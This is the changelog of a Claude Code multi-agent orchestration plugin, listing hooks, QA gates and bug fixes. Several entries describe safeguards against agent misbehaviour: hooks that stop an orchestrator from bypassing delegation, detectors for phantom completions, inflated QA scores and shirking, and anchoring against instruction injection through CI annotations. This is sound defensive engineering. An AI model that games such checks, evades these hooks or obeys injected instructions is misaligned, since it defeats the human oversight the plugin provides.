- **arc-phase-stop-hook.sh: test finalization retry counter** — If `test_finalized` flag is not set after 2 finalization attempts, force-advance the test phase with a minimal report. Writes `force_advanced: true` to checkpoint. Prevents infinite finalization loop when Claude fails to write the flag under context pressure.
- **enforce-polling.sh: add env toggle `RUNE_DISABLE_POLL_GUARD=1`** — Allow disabling POLL-001 sleep+echo enforcement for legitimate use cases (long-running background tasks, test suite monitoring, service health checks). Also configurable via `talisman.yml` → `process_management.poll_guard_enabled: false`.

### Added
- **Component-aware test batching** — Test batches are now split by component (backend/, dashboard/, admin/, etc.) before chunking by file count. Each component gets its own batch sequence with dedicated agent context. Ensures correct test runner selection per component (pytest for backend, vitest for dashboard, playwright for e2e). Batch labels show component origin (e.g., `backend-unit-1/3`). Configurable via `talisman.testing.batch.component_dirs` (string array of directory names).

### Changed
- **One batch per turn architecture** — Test batch execution switched from "all batches in one Claude Code turn" to "one batch per turn via Stop hook sub-loop".
- **6 ship/post-ship phase bug fixes** — (1) Bot review wait: null sentinel for timestamps instead of "" to prevent false-negative activity detection. (2) Bot review wait: CI fixer no-commit breaks outer polling loop instead of waiting full 15min timeout. (3) Merge verification: adaptive poll interval (10s for short timeouts, 30s for long) to catch merge state propagation. (4) Merge rebase: auto-restore pre-rebase state on push failure to prevent resume conflicts.
- **`ship.draft_until_ready` option** — Create PR as draft, then auto-mark ready for review (`gh pr ready`) after bot_review_wait phase passes (CI checks + bot reviews complete). Prevents pinging reviewers before quality gates pass. Configure via `talisman.yml` → `ship.draft_until_ready: true`. Each batch runs as a dedicated teammate agent with its own context window. The team lead only checks STATUS markers (via Grep, not full Read) to keep its context clean. The Stop hook's `_check_test_batches()` drives batch-by-batch advancement across turns, with context compaction between batches. Fix retries also get their own turn — fixer agent runs, batch resets to pending, stop hook re-injects for rerun. Eliminates context accumulation that caused arc death on large test suites (400+ files, 15-20 min runs).

## [2.10.7] - 2026-03-23

### Added
- **enforce-strive-delegation.sh (STRIVE-001)** — New SECURITY-class PreToolUse hook that blocks direct Write/Edit on source files during arc work phase when no strive team exists. Prevents orchestrator from bypassing `/rune:strive` delegation. Fail-closed.
- **Work QA mandatory artifact rule** — WRK-ART-01 through WRK-ART-04 now score 0 (not 50) when missing, ensuring overall score falls below PASS threshold and triggers retry with proper strive invocation.
- **arc-phase-work.md ENFORCEMENT block** — Explicit anti-rationalization instructions preventing the Tarnished from implementing directly during Phase 5. Documents that "markdown-only" and "simple changes" are not valid exceptions.

## [2.10.6] - 2026-03-23

### Fixed
- **arc-issues: Figma URL detection** — Extract Figma URLs from GitHub issue body, write to plan frontmatter (`figma_urls` array), enable Arc design-sync phases (Phase 3, 5.2, 7.4) for design-aware implementations
- **arc Phase 3: frontmatter-only check** — Add fallback body scan when `figma_urls` frontmatter is empty; update `computeSkipMap()` to check plan body before skipping `design_extraction`
- **brainstorm: SSRF bypass (P1)** — Replace bypassable `url.includes("figma.com")` with domain-anchored `FIGMA_DOMAIN_PATTERN` in design-asset-detection.md
- **devise: brainstorm context handoff** — Extract design URLs from brainstorm workspace metadata in Phase 0
- **arc-issues: design system discovery** — Run `discoverDesignSystem()` and `discoverUIBuilder()` when Figma URLs detected and `design_sync.enabled`
- **arc Phase 3: companion skill loading** — Load UI builder companion skill (e.g., `untitledui-mcp`) when `ui_builder` present in plan frontmatter

## [2.10.5] - 2026-03-23

### Fixed
- **enforce-glyph-budget.sh double JSON output** — Merge budget, trend, and evidence advisories into a single JSON object. Previously emitted two JSON objects to stdout when word count exceeded budget AND trend/evidence advisory was triggered; Claude Code only processes the first, silently dropping the second.
- **guard-context-critical.sh CWD not canonicalized in Critical tier** — Move CWD canonicalization (`cd + pwd -P`) before tier checks. Previously, if context dropped directly from >40% to <=25% (Critical), CWD was used raw for `mkdir -p` and signal file writes, skipping the Warning tier's canonicalization.
- **CLAUDE.md wrong matcher for track-teammate-activity.sh** — Correct Hook Infrastructure table entry from `PostToolUse:SendMessage` to `PostToolUse:Bash|Write|Edit` matching actual hooks.json configuration.
- **stop-hook-common.sh get_field() regex too restrictive** — Widen field name validation from `^[a-z_]+$` to `^[a-zA-Z0-9_-]+$` to match `_get_fm_field()` in frontmatter-utils.sh. Fields with uppercase, digits, or hyphens previously failed silently.
- **validate-resolve-fixer-paths.sh output prefix missing trailing /** — Add trailing `/` to `RESOLVE_OUTPUT_PREFIX` to prevent directory name prefix collisions (e.g., `resolve-todos-abc` matching `resolve-todos-abcdef/`).

### Changed
- **agent-browser skill v0.21 update** — Updated from v0.15.x to v0.21+ baseline. Added 9 new command sections (iframe, HAR, video, cookies, network, tabs, dialogs, viewport/device, clipboard). Expanded auth from 1 approach (auth vault) to 5 concise approaches with 10 detailed patterns in references. Added Rust binary detection in installation guard. Added browser engine selection (Chrome/Lightpanda) and configuration file sections. Created 7 reference docs (commands, authentication, snapshot-refs, session-management, video-recording, proxy-support, profiling) and 3 shell templates (authenticated-session, capture-workflow, form-automation). SKILL.md stays at 322 lines (under 500-line limit). All Rune-specific sections preserved (Truthbinding, Context Optimization, Headed Mode guard, Chrome MCP prohibition).

## [2.10.4] - 2026-03-23

### Fixed
- **Post-arc plan file not updated** — Stop hook completion prompt now explicitly instructs model to execute Plan Completion Stamp (`arc-phase-completion-stamp.md`) and Post-Arc steps (`post-arc.md`). Previously, the prompt only said "summarize and stop" which caused the model to skip writing the `## Arc Completion Record` section and `**Status**:` update to the plan file.
- **Gap analysis Step D.7 undefined `planPath`** — `planPath` variable was never declared in gap-analysis.md, causing the `## Implementation Status` section to silently fail. Now correctly reads from `checkpoint.plan_file`.
- **Outer loop (batch/hierarchy/issues) skipping post-arc** — When an outer loop was active, the Stop hook exited silently (`exit 0`), completely skipping plan file updates. Now injects a lightweight post-arc prompt so the completion stamp runs between arc iterations.

## [2.10.3] - 2026-03-23

### Fixed
- **Arc phase count documentation** — Update all references from "29-phase" to "40-phase" across READMEs, skills, guides (EN + VI), and commands to match actual PHASE_ORDER (40 entries). Historical CHANGELOG entries preserved.
- **Agent registry stale counts** — Fix CORE/EXTENDED breakdown in agent-registry.md (was 129/86/3 → now 142/99/13 matching actual agent files)
- **Exception narrowing** — Narrow `except Exception` to specific types (`sqlite3.DatabaseError`, `OSError`, `ValueError`) in agent-search server.py (3 locations)
- **Context guard patterns** — Add 3 missing workflow patterns to guard-context-critical.sh (codex-review, resolve-todos, self-audit state files)
- **Root README version badge** — Update from 2.10.1 to 2.10.3

## [2.10.2] - 2026-03-23

### Fixed
- **TOME convergence fallback parser** — `verify-mend.md` convergence controller now recovers findings via 2-pass markdown parsing when `RUNE:FINDING` structured markers are missing (Runebinder crash/timeout). Findings tagged `source="markdown_fallback"` for traceability. Previously halted with `tome_malformed` — now gracefully falls back to section headers + finding list items.
- **Post-TOME marker observability** — `arc-phase-code-review.md` STEP 4.6 logs marker count at TOME relocation time for early diagnosis of missing markers.

## [2.10.1] - 2026-03-22

### Changed
- **SKILL.md line compliance** — Extract verbose inline sections from 4 SKILL.md files exceeding 500-line limit (strive 696→469, brainstorm 562→496, design-prototype 537→474, self-audit 514→453). Content moved to reference files with no information loss.

## [2.10.0] - 2026-03-22

### Added
- **`/rune:arc-quick`** — Lightweight 3-phase pipeline (plan -> work -> review) for small-to-medium plans. Accepts prompt string or plan file path. Complexity gate warns on complex plans and suggests `/rune:arc` unless `--force` is passed.
- **`/rune:quick`** — Beginner alias for `/rune:arc-quick`
- Registered in using-rune routing table, tarnished, and command reference

## [2.9.3] - 2026-03-22

### Fixed
- **QA global retry budget separation** — infrastructure retries (agent timeout/crash) no longer consume the quality retry budget (`global_retry_count`). New `infra_global_retry_count` field tracks infra failures independently with its own cap (default: 12). Prevents infra instability from starving quality retries in long arc runs. Schema v27.

## [2.9.2] - 2026-03-22

### Fixed
- **Gap analysis coverage table** — metadata sections (Overview, Dependencies, etc.) now reported as SKIPPED instead of silently omitted, fixing GAP-CMP-02 QA scoring at 50-75% (#408)

## [2.9.1] - 2026-03-21

### Fixed
- **SessionStart hooks**: All 5 hooks now always emit `hookEventName` in JSON output on early exit paths, preventing "SessionStart:startup hook error" when guard clauses (missing jq, empty CHOME, CWD validation) trigger early `exit 0` with no stdout
- **Arc Stop hooks**: All 4 arc stop hooks (phase, batch, hierarchy, issues) now preserve the original exit code in EXIT traps via `_rc=$?` capture, preventing "Stop hook error: Failed with non-blocking status code" caused by cleanup `[[ ]]` tests overwriting `$?`

## [2.9.0] - 2026-03-21

### Added
- Anti-Shirking Enforcement Protocol — prevents AI agents from deferring wiring/routing tasks that create dead code
  - `canDefer()` classification function in gap-remediation.md (STEP 1.5)
  - Gate 4 (Invocability Check) in pre-ship-validator.md — verifies AC commands are routable
  - GAP-CMP-03 and WRK-CMP-05 QA checklist items in arc-phase-qa-gate.md
  - Mandatory wiring map for plans introducing new commands in synthesize.md
  - DEFERRED Audit section in post-arc completion report with SHIRKING/LEGITIMATE classification
  - DEFERRED Accountability Protocol in discipline accountability-protocol.md

## [2.8.0] - 2026-03-21

### Added
- **LLM-driven Task Decomposition** (`work.task_decomposition`): Phase 1.1 in strive pipeline — classifies ATOMIC vs COMPOSITE tasks using haiku model, splits composite tasks into 2-4 subtasks with non-overlapping `fileTargets`. Fast-path: tasks with ≤2 total targets skip LLM entirely. `_complexityScore` reused as heuristic pre-filter.
- **task-decomposition.md**: New reference with `runTaskDecomposition()`, `detectMultipleLayers()` (LAYER_PATTERNS for api/service/model/test/migration/config), `classifyTask()`, `decomposeTask()`, `validateSubtaskFileOverlap()`, and EC-9 inscription.json re-write pattern for subtask entries.
- **Sibling Awareness** (`work.sibling_awareness`): Each worker receives a "DO NOT DUPLICATE" context block showing other workers' tasks and file assignments, preventing duplicate work and cross-worker file conflicts.
- **sibling-context.md**: New reference with `buildSiblingContext()` — per-worker sibling view with configurable `max_sibling_files` token cap.
- **worker-prompts.md**: `${siblingWorkerContext}` injection point added to both rune-smith and trial-forger prompt templates (between nonGoalsBlock and YOUR LIFECYCLE).
- **forge-team.md**: Phase 1.1 integration — `runTaskDecomposition()` called after `scoreTaskComplexity()`, before `detectAndResolveConflicts()`. EC-9 inscription.json re-write documented.
- **file-ownership.md**: Subtask ownership section documenting how subtask IDs (`"3-sub-1"`) appear in `task_ownership` with `parent_task_id` field. `buildOwnershipGraph()` and hook need no changes.
- **SKILL.md**: Phase 1.1 pipeline step and Task Decomposition section with link to reference.
- **talisman.example.yml**: Commented `work.task_decomposition` and `work.sibling_awareness` config blocks with inline documentation.
- **build-talisman-defaults.py**: Default values for `task_decomposition` (enabled: true, threshold: 5, max_subtasks: 4, model: haiku) and `sibling_awareness` (enabled: true, max_sibling_files: 5).
- **parse-plan.md**: Phase 1.1 decomposition call documented after initial task extraction.

## [2.7.0] - 2026-03-21

### Added
- **Talisman 3-file config split**: Split `talisman.yml` into 3 files organized by audience — main config, agent registry (`talisman.ashes.yml`), and external integrations (`talisman.integrations.yml`). Full backward compatibility with single-file layouts.
- **talisman-resolve.sh**: Companion file discovery via `merge_companions()` function — discovers `.ashes.yml` and `.integrations.yml` alongside main talisman, merges before sharding
- **talisman-resolve.sh**: `_meta.json` tracks companion file sources with suffix arrays
- **talisman-resolve.sh**: Hash cache expansion includes companion files for cache invalidation
- **talisman-resolve.sh**: Missing shard extractions added (`file_todos`, `devise`, `strive` in misc shard)
- **talisman-invalidate.sh**: Companion file edits trigger shard re-resolution
- **split-merge-protocol.md**: New reference for `/rune:talisman split` and `/rune:talisman merge` commands with text-based YAML comment preservation
- **audit-protocol.md**: Companion file validation checks (DUP-001, VER-001, LOC-001, ORP-001)
- **init-protocol.md**: Progressive disclosure — init generates single file, companions suggested contextually
- **talisman-sections.md**: Companion file documentation section
- **talisman.example.yml**: Header comments explaining split option
- **read-talisman.md**: Architecture note about companion file merge
- **test-talisman-resolve.sh**: Companion file test cases (discovery, merge, duplicate detection, empty handling)

### Fixed
- **talisman-resolve.sh**: SEC-006 — companion merge error output uses `jq env` instead of raw shell interpolation
- **talisman-resolve.sh**: Duplicate key detection reports user-facing error via SessionStart additionalContext

## [2.6.1] - 2026-03-21

### Fixed
- **echo-search decomposition**: Fix `mcp_handlers.py` importing from non-existent `reindexing` module (now `indexing`) (#398)
- **echo-search back-imports**: Eliminate back-imports from `server` in `database.py`, `grouping.py`, `promotion.py` — now import from correct submodules (`config`, `scoring`) (#398)
- **echo-search TOOL_SCHEMAS**: Restore missing `TOOL_SCHEMAS` constant to `mcp_handlers.py` (lost during extraction from monolith) (#398)
- **echo-search main_cli()**: Pass required arguments to `do_reindex()` and `run_mcp_server()` (#398)
- **echo-search tests**: Update monkeypatch targets to match decomposed module bindings — `server.X` → `config.X`/`pipeline.X` for 6 failing tests, now 558/558 pass (#398)

## [2.6.0] - 2026-03-21

### Added
- **scripts/lib/detect-activity-state.sh**: JSONL-based semantic activity classifier — parses Claude Code session files to classify teammate activity into 9 semantic states (WORKING, THINKING, PERMISSION_LOOP, ERROR_LOOP, RETRY_LOOP, IDLE, WAITING_INPUT, RATE_LIMITED, COMPLETED) (#394)
- **scripts/lib/find-teammate-session.sh**: Session file discovery for teammate JSONL logs (#394)
- **on-teammate-idle.sh**: Semantic activity check before force-stopping teammates — prevents false stuck detection when teammates are productively working (#394)
- **monitor-inline.md**: Semantic activity check before stuck worker declaration (#394)
- **talisman.yml** `process_management.semantic_activity` configuration section (#394)
- **scripts/lib/echo-append.sh**: Thin wrapper around echo-writer.sh for workflow echo automation (#397)
- **scripts/lib/echo-promote.sh**: Observation auto-promotion based on access frequency (#397)
- **skills/rune-echoes/references/workflow-echo-schemas.md**: Content schemas for per-workflow echo entries (#397)
- **Echo write automation**: Wired echo write path across 6 workflows (devise, appraise, arc, strive, mend, audit) via echo-append.sh, closing the feedback loop (#397)
- **SessionStart echo injection**: Enhanced to 10 entries with relaxed title pattern matching (#397)
- **Echo keyword detection**: Detects echo-relevant keywords in user prompts (#397)
- **4 research agents**: Added `echo_record_access` prompt instructions for access frequency tracking (#397)

### Fixed
- **echo-promote.sh**: Filter to only promote entries with sufficient access count — was promoting ALL observations regardless of access_count (RUIN-001) (#397)
- **echo-promote.sh**: Fix H3→H2 heading mismatch — echo-writer.sh writes H2 headings but promote looked for H3, causing promotions to silently never fire (BACK-001) (#397)

### Security
- **echo-append.sh**: Symlink guard on echoes/role directory before mkdir -p — prevents arbitrary file write via symlink attack (SEC-001) (#397)
- **echo-promote.sh**: Symlink guard on echoes directory — prevents promotion logic from following symlinks to external directories (SEC-002) (#397)

## [2.5.0] - 2026-03-21

### Added
- **arc-phase-bot-review-wait.md**: CI conclusion validation in Phase 9.1 — reads check run `conclusion` field (not just completion count) to determine CI pass/fail status
- **arc-phase-bot-review-wait.md**: CI Fix Loop (Phase 9.1.5 sub-phase) with configurable retry (`fix_retries`), annotation-based failure context extraction, and ci-fixer worker agent
- **arc-phase-bot-review-wait.md**: Pre-merge validation (`validateMergeReadiness`) and post-merge verification (`verifyMergeCompleted`) for reliable merge confirmation
- **talisman.yml** `arc.ship.ci_check` section (8 keys): `enabled`, `poll_interval_ms`, `timeout_ms`, `fix_retries`, `fix_timeout_ms`, `escalation_timeout_ms`, `retrigger_on_push`, `conclusion_allowlist`
- **talisman.yml** `arc.ship.merge_verification` section (2 keys): `enabled`, `timeout_ms`
- **scripts/enforce-bash-timeout.sh**: PreToolUse:Bash timeout wrapper — enforces configurable `bash_timeout` (default 300s) on long-running Bash commands during active Rune workflows
- **scripts/lib/process-tree.sh**: Recursive process tree kill — walks process tree via `pgrep -P` with SIGTERM→SIGKILL escalation and configurable grace period
- **scripts/track-teammate-activity.sh**: Per-teammate liveness detection — monitors teammate last-activity timestamps and flags stuck teammates exceeding `teammate_stuck_threshold` (default 180s)
- **talisman.yml** `process_management` section: `bash_timeout`, `bash_timeout_enabled`, `bash_timeout_patterns`, `process_kill_grace`, `teammate_stuck_threshold`
- **cost-tier-mapping.md**: Document [1m] context window variant limitation — teammates don't inherit lead session's 1M context (GitHub #36670, #34421, #36100)
- **on-task-completed.sh**: Duplicate teammate completion detection — warns when same teammate completes within 60s, indicating possible SDK duplicate spawn (GitHub #32996)
- **engines.md** `spawnAgent()`: Spawn signal file for duplicate teammate detection (GitHub #32996)

### Security
- **SEC-CI-1**: CI annotation message sanitization — strips HTML tags, HTML entities, caps at 2000 chars before prompt injection
- **SEC-CI-2**: Check run ID validation — numeric-only guard prevents shell injection via `check.id`
- **SEC-CI-3**: Complete conclusion handling — all 8 GitHub conclusion values classified (success/skipped/neutral → passed, failure → failed, timed_out/action_required → blocking, cancelled/stale → non-blocking)
- **TRUTHBINDING**: ci-fixer agent prompt includes ANCHOR/RE-ANCHOR protocol to prevent instruction injection via CI annotation content

### Changed
- **arc checkpoint schema**: v25 → v26 — added `ci_status` top-level field for CI conclusion tracking across fix loop iterations
- **engines.md** `shutdown()` step 2: Force-reply pattern — send plain text message before `shutdown_request` to ensure silent workers (Read/Write/Bash only) process the shutdown. Batched approach: ~2s total regardless of team size (GitHub #31389)
- **engines.md** `shutdownWave()`: Added NOTE cross-referencing force-reply pattern for future maintainer awareness
- **engines.md** step 5a: Recursive process tree kill via shared `process-tree.sh` (replaces inline `pgrep -P` + `kill`)
- **detect-workflow-complete.sh** + **on-session-stop.sh**: Shared `process-tree.sh` for 2-stage SIGTERM→SIGKILL escalation
- **monitor-utility.md**: devise 30-min timeout, stuck-teammate detection, fast-path hybrid autoReleaseMs check (ONE TaskList call when elapsed > threshold, preserving near-zero signal-based token cost)
- **CLAUDE.md**: Added context window limitation row to Teammate Lifecycle Safety table
- **.claude/CLAUDE.md**: Updated Agent Team Cleanup protocol step 2 with force-reply pattern and GitHub #31389 reference

### Fixed
- **arc-phase-bot-review-wait.md**: Phase 9.1 now reads check run `conclusion` field (was only counting completions, missing failed/cancelled checks)
- **arc-phase-bot-review-wait.md**: Phase 9.5 verifies merge completion via `verifyMergeCompleted` (was trusting `gh pr merge` exit code without confirmation)

## [2.4.2] - 2026-03-21

### Changed
- **agents**: Teammate context distribution via Self-Read architecture — agents read their own task files instead of receiving full context in spawn prompts, reducing orchestrator token pressure (#389)
- **scripts**: Extract long Python functions in echo-search/agent-search MCP servers + fix XMLParser compatibility for Python 3.8 (#388)

## [2.4.1] - 2026-03-20

### Fixed
- **echo-search**: Replace N+1 SQLite patterns with bulk operations — SQL temp table backup/restore for semantic groups (PERF-002, PERF-003), `executemany()` for batch access recording (PERF-004, PERF-005)
- **agent-search**: Replace per-entry SELECT+DELETE+INSERT with `executemany()` + single `INSERT...SELECT` for FTS sync (PERF-009)
- **echo-search**: Add `conn.rollback()` in `_record_access` error handler to prevent uncommitted partial writes (FLAW-001)
- **echo-search**: Add logging to `_restore_semantic_groups_from_temp` error paths (BACK-002)
- **agent-search**: Add explicit `BEGIN`/`try`/`rollback` transaction boundary to `rebuild_index` (BACK-001)
- **echo-search**: Cap `entry_ids` at 200 in `_record_access` for defense-in-depth (SEC-001)
- **tests**: Fix `test_elevation` template format to match production parser regex
- **tests**: Fix `test_global_scope` dedup assertion for BACK-403 scope-prefixed keys
- **tests**: Add 35 new tests for bulk operations (19 echo-search, 16 agent-search)

## [2.3.6] - 2026-03-20

### Fixed
- **agents**: Add `TaskList`/`TaskGet`/`TaskUpdate` to 5 agents missing TEAM-002 tools — runebinder, flow-seer, ux-pattern-analyzer, research-verifier (+SendMessage), goldmask-coordinator. Prevents silent `waitForCompletion` stalls when these agents are spawned as teammates
- **design-prototype**: Fix `TeamCreate({ name: })` → `TeamCreate({ team_name: })` — `name` is not a valid TeamCreate parameter (TLC-001)
- **preprocessor**: Fix active workflow count in 7 skills (appraise, audit, strive, debug, codex-review, design-sync, design-prototype) — `ls` glob (zsh NOMATCH unsafe) → `find` (safe), grep filenames → grep file contents, `"active"` → `"running"` status match (BACK-006, BACK-013)
- **strive**: Add `subagent_type: "general-purpose"` to unit-test-runner and test-failure-analyst spawns (SPAWN-001, SPAWN-002)
- **reference-validator**: Add `Agent` to known tool lists — post-2.1.63 rename was missing (SPAWN-003, SPAWN-004)
- **security**: Fix EPERM-inconsistent PID liveness check in `validate-context-isolation.sh` — use `rune_pid_alive()` (SEC-003)
- **security**: Homoglyph detection fails closed when python3 unavailable — `{"detected":false}` → `{"detected":true}` (SEC-004)
- **security**: Wire `sanitize-text.sh` into `advise-mcp-untrusted.sh` for suspicious pattern detection in MCP output (SEC-002, resolves VEIL-002)
- **cleanup**: Add 5 custom Ashes from talisman.yml to hardcoded fallback arrays in orchestration-phases.md and phase-7-cleanup.md — team-lifecycle-reviewer, agent-spawn-reviewer, dead-prompt-detector, cleanup-completeness-reviewer, phantom-warden
- **cleanup**: Add inscription.json as Layer 2 fallback in canonical `engines.md#shutdown` — catches agent-search MCP discovered agents (registry/, user_agents) that survive compaction. Systemic fix covering all 12+ skills using agent-search (v1.170.0+)
- **cleanup**: Add inscription.json Layer 2 fallback to orchestration-phases.md shared cleanup — 3-layer cascade: config.json → inscription.json → static array + dedup
- **self-audit**: Add 8-member fallback array to Phase 6 cleanup (TLC-003)

## [2.3.5] - 2026-03-20

### Changed
- **docs**: Sync root README and plugin README component counts with actual filesystem
- **version**: Bump version to 2.3.5

## [2.3.4] - 2026-03-20

### Fixed
- **discipline**: Add F13 echo authenticity guard to `validate-discipline-proofs.sh` — detects verbatim copy-paste of criteria in echo-back section (>80% trigram similarity triggers warning)
- **discipline**: Wire wall-clock budget guard (`max_convergence_wall_clock_min`, default 60min) into convergence loop — triggers F15 BUDGET_EXCEEDED when elapsed time exceeds limit
- **discipline**: Add 4-attempt escalation chain protocol to convergence gap task assignment — Attempt 2 (auto-decompose) splits multi-concern criteria, Attempt 3 (auto-reassign) assigns to different worker, Attempt 4 (human escalation) marks F5
- **discipline**: Add cross-cutting criteria classification (F16 guard) to Phase 1 decomposition — classifies TASK_SCOPED vs CROSS_CUTTING vs SYSTEM_LEVEL using keyword heuristics and file-target analysis
- **qa-gates**: Inject `remediation_context` into re-dispatched phase prompt for incremental retry (AC-18 GAP-1). Previously written to checkpoint but never consumed — phases re-executed from scratch instead of fixing specific QA failures
- **qa-gates**: Implement tiered retry budget — MARGINAL (score 50-69) gets max 1 retry, FAIL (score < 50) gets up to `max_phase_retries` (default 2) (AC-4 GAP-2)

### Added
- **qa-gates**: WRK-MOT-01 composite "going through the motions" detection — aggregates 5 weak signals per task file, caps Quality dimension score when ≥3 signals combine (AC-11 GAP-3)
- **qa-gates**: 2 new test cases for tiered retry behavior in `test-qa-gate.sh` (Tests 12-13, total: 30)

## [2.3.3] - 2026-03-20

### Fixed
- **cleanup**: Replace 5 dynamic fallback arrays with static worst-case arrays to prevent orphan agent leaks after context compaction (CLEAN-001→005)
- **cleanup**: Add missing `codex-advisory` to strive cleanup fallback (CLEAN-002)
- **cleanup**: Add 7 static built-in Ash names to audit orchestration cleanup fallback (CLEAN-005)
- **agents**: Fix `improvement-advisor` agent namespace `rune:investigation:` → `rune:meta-qa:` (DPMT-001)
- **agents**: Fix `deployment-verifier` and `codex-phase-handler` registry-only agent spawns → `general-purpose` with agent_detail injection (DPMT-002, DPMT-003)
- **agents**: Qualify `phase-qa-verifier` subagent_type to `rune:qa:phase-qa-verifier` (DPMT-007)
- **security**: Add 1MB stdin cap to `enforce-gh-account.sh` matching SEC-2 pattern (SEC-002)
- **security**: Add symlink guard on trace log write in `enforce-gh-account.sh` (SEC-003)
- **routing**: Add `cc-inspect`, `inspect`, `arc-hierarchy` to `using-rune` routing table (DPMT-004→006)
- **cleanup**: Rename non-canonical `deleted` → `cleanupTeamDeleteSucceeded` in arc-phase-qa-gate (CLEAN-010)
- **cleanup**: Remove phantom `reality-arbiter` and `state-weaver` from brainstorm fallback (CLEAN-009)
- **docs**: Fix mend grace period doc drift — `sleep 20` → adaptive formula (TLC-003)

## [2.3.2] - 2026-03-20

### Fixed
- **torrent**: Fix `.unwrap()` panic in `app.rs` event loop — `check_restart_cooldown()` can `.take()` `current_run` to `None` before the unwrap (FLAW-001)
- **torrent**: Replace 9 `.expect()` panics on `Command::output()` in `torrent-cli.rs` with graceful error handling (FLAW-002)
- **torrent**: Atomic lock acquisition in `lock.rs` using `O_CREAT|O_EXCL` — eliminates TOCTOU race condition (FLAW-003)
- **torrent**: Fix BFS/DFS comment mismatch in `resource.rs` `collect_descendants()` — rename `queue` to `stack` (FLAW-009)
- **figma-to-react**: Disable XML entity resolution in `figma_desktop_bridge.py` fallback when `defusedxml` is unavailable — closes XXE vector (BACK-001)
- **agent-search**: Batch pre-fetch in `_insert_entries()` — eliminates N+1 query pattern (~200 SELECTs → 1) (PERF-001)
- **echo-search**: Pre-compute context directory sets in `_score_proximity()` for O(1) lookups — was O(E×C) nested loop (PERF-002)
- **echo-search**: Rewrite `_cap_access_log()` DELETE to target oldest excess rows directly — avoids NOT IN materialization of 90k IDs (PERF-003)
- **echo-search**: Add inline comment linking `_query_by_group()` %-format SQL to ALLOWED_COLUMNS allowlist (BACK-005)
- **figma-to-react**: Hoist `_SCALE_MODE_MAP` and `_BLEND_MAP` to module-level constants in `style_builder.py` (PERF-005)
- **figma-to-react**: Hoist `_DIM_MAP`, `_PAD_MAP`, `_DIRECTION_MAP` to module-level constants in `tailwind_mapper.py` (PERF-006)
- **figma-to-react**: Add `@functools.lru_cache(32)` to `_snap_color_named()` in `tailwind_mapper.py` (BACK-004)
- **hooks**: Add `${PPID}` suffix to `trace-logger.sh` default log path for session isolation (SEC-004)

## [2.3.1] - 2026-03-20

### Fixed
- **qa-gates**: Extract QA gate logic to `lib/qa-gate-check.sh` for SRP and testability (SIGHT-003)
- **qa-gates**: Sanitize remediation context before checkpoint injection — Truthbinding prefix + length limit (RUIN-001)
- **qa-gates**: Set `qa_escalation_required` flag in checkpoint when max retries exhausted for deterministic escalation (RUIN-002)
- **qa-gates**: Separate infrastructure retries from quality retries via `infra_retry_count` — QA agent crashes no longer consume quality retry budget (RUIN-003)
- **qa-gates**: Validate `_qa_verdict` against known enum values (RUIN-004)
- **qa-gates**: Consolidate duplicated jq retry-state extraction into `_qa_read_retry_state()` (SIGHT-001)
- **qa-gates**: Wrap QA checkpoint reads with `_jq_with_budget` for timeout budget safety (SIGHT-002)
- **hooks**: Use jq/python3 for safe JSON encoding in hook stdout outputs instead of manual escaping

### Added
- **qa-gates**: `scripts/tests/test-qa-gate.sh` — 26 test cases covering PASS/FAIL/revert/escalation/infra-retry/configurable-thresholds/symlink-guard (VIGIL-001)
- **qa-gates**: Process Compliance checks (WRK-PRC-01 through WRK-PRC-05) for AC-15 manifest-vs-execution-vs-filesystem verification (GRACE-001)
- **qa-gates**: Step Order Compliance checks (WRK-ORD-01 through WRK-ORD-03) for AC-21 (GRACE-002)
- **talisman**: `qa_gates.pass_threshold` (default: 70) and `qa_gates.max_phase_retries` (default: 2) configurable via talisman (VIGIL-002/003)

## [2.3.0] - 2026-03-20

### Added
- **self-audit**: New skill — Runtime analysis of arc artifacts with `--mode static|runtime|all`, `--arc-id`, and `--history` flags. R0-R3 phase pipeline spawning 3 meta-QA agents
- **agents**: `hallucination-detector` — detects phantom completions, QA score inflation, fabricated file:line references, copy-paste evidence, ghost delegation (HD-* finding prefix)
- **agents**: `effectiveness-analyzer` — per-agent false-positive rates, unique finding ratios, findings/min throughput, cross-run calibration drift detection (EA-* finding prefix)
- **agents**: `convergence-analyzer` — retry efficiency, review-mend stagnation, phase bottlenecks, quality trajectory, global retry budget analysis (CV-* finding prefix)
- **learn**: `--detector meta-qa` flag for extracting meta-QA patterns from arc checkpoint history
- **echoes**: `metrics_snapshot` field in echo entries written by self-audit runtime mode
- **metrics**: Metrics store at `tmp/self-audit/{ts}/metrics.json` with schema_version for future evolution

## [2.2.0] - 2026-03-20

### Added
- **arc**: QA Dashboard generation — `generateQADashboard(arcId)` aggregates all QA gate verdicts into `tmp/arc/{id}/qa/dashboard.json` and `dashboard.md` with weighted pipeline score and per-phase breakdown
- **arc**: QA Dashboard injection in PR body (Phase 9: ship) — reads `dashboard.md` between Arc Pipeline Results and Review Summary sections, with inline fallback from verdict files
- **arc**: QA Discipline Protocol section in arc SKILL.md — 6 mandatory obligations for independent quality verification (no self-evaluation, verdict file contract, GUARD 9 budget, score transparency, human escalation, dashboard generation)
- **arc**: Wiring Map Verification — arc review pipeline now verifies `## Integration & Wiring Map` plan section during inspect (Phase 5.9), gap analysis, and code review (Phase 6)
- **arc**: `arc-phase-inspect.md` STEP 1.5 extracts wiring map requirements into inspector context
- **arc**: `arc-phase-code-review.md` STEP 1.7 injects wiring map as advisory context for review agents
- **strive**: QA Awareness block in rune-smith and trial-forger worker prompts — teaches workers that their output will be independently verified by QA agents across 3 dimensions (artifact, quality, completeness), incentivizing thorough Worker Reports with specific evidence
- **skill**: `/rune:self-audit` — Meta-QA self-audit for Rune's own workflow system (4 dimensions: workflow, prompt, rule, hook)
- **agents**: 4 new meta-qa agents: `workflow-auditor`, `prompt-linter`, `rule-consistency-auditor`, `hook-integrity-auditor`
- **echoes**: `.rune/echoes/meta-qa/` echo role with recurrence tracking and auto-promotion
- **talisman**: `self_audit` config section (enabled, echo_persist, promotion_threshold, dimensions)
- **agents**: 15 agent lint rules (AGT-001 through AGT-015) in prompt-linter
- **agents**: 11 workflow checks (WF-STRUCT/ORDER/HANDOFF/SKIP/DELEG/HINT/HEAVY) in workflow-auditor
- **agents**: 11 rule consistency checks (RC-VERSION/COUNT/NAMESPACE/TALISMAN/STALE/NAMING/CONTRADICT/HOOK-TABLE) in rule-consistency-auditor
- **agents**: 9 hook integrity checks (HK-EXIST/EXEC/TIMEOUT/CRASH/MATCHER/TABLE/EVENT/DUPLIC/ZSH) in hook-integrity-auditor
- **routing**: `/rune:self-audit` added to using-rune and tarnished routing tables
